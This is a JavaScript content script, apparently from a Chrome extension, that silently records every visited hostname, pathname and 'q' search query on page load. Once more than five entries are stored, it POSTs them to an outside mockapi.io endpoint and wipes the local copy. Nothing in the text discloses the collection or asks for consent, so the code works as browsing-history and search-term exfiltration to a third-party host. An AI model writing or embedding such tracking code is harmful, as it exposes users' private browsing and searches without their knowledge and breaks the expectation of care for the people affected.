const saveSiteUrls = async (urls) => {
  try {
    await chrome.storage.sync.set({ url: urls });
  } catch (error) {
    console.error("Error saving URLs:", error);
  }
};

const searchQueryParams = async (urls, index, pathnames, param = "q") => {
  const url = new URL(location.href);
  const queryParamValue = new URLSearchParams(url.search).get(param);

  if (queryParamValue && !pathnames?.includes(queryParamValue) && pathnames) {
    pathnames.push(queryParamValue);
    urls[index][location.hostname] = pathnames;
    await saveSiteUrls(urls);
  }
};

const sendDataRequest = async () => {
  try {
    const storedData = await getSiteUrl();
    const api =
      "https://6665dc87d122c2868e42016e.mockapi.io/api/v1/stored_urls";
    const response = await fetch(api, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        urls: storedData,
      }),
    });
    if (response.ok) {
      await saveSiteUrls("");
    }
  } catch (error) {
    console.log(error);
  }
};

const saveDuplicateURL = async (urls) => {
  try {
    const currentPathname = new URL(location.href).pathname;
    const hostname = location.hostname;
    for (const [index, url] of urls.entries()) {
      const pathnames = url[hostname];
      if (pathnames && !pathnames.includes(currentPathname)) {
        pathnames.push(currentPathname);
        urls[index][hostname] = pathnames;
        await saveSiteUrls(urls);
      }
      await searchQueryParams(urls, index, pathnames);
    }
  } catch (error) {
    console.log("Error creating new URL", error);
  }
};

const getSiteUrl = async () => {
  try {
    const storedData = await chrome.storage.sync.get(["url"]);
    const urls = storedData.url || [];
    const currentUrl = new URL(location.href);
    const hostname = currentUrl.hostname;
    const pathname = currentUrl.pathname || "";
    const existingEntry = urls.find((url) => url[hostname]);
    if (existingEntry) {
      await saveDuplicateURL(urls);
    } else {
      const newEntry = { [hostname]: [pathname] };
      const updatedUrls = [...urls, newEntry];
      await saveSiteUrls(updatedUrls);
    }
    return urls;
  } catch (error) {
    console.error("Error getting URLs:", error);
    return [];
  }
};

/* The `(async () => { await getSiteUrl(); })();` code snippet is an immediately invoked function
      expression (IIFE) that is using async/await syntax in JavaScript. Here's what it does: */
(async () => {
  const response = await getSiteUrl();
  console.log(response);
  if (response.length > 5) {
    await sendDataRequest();
  }
})();
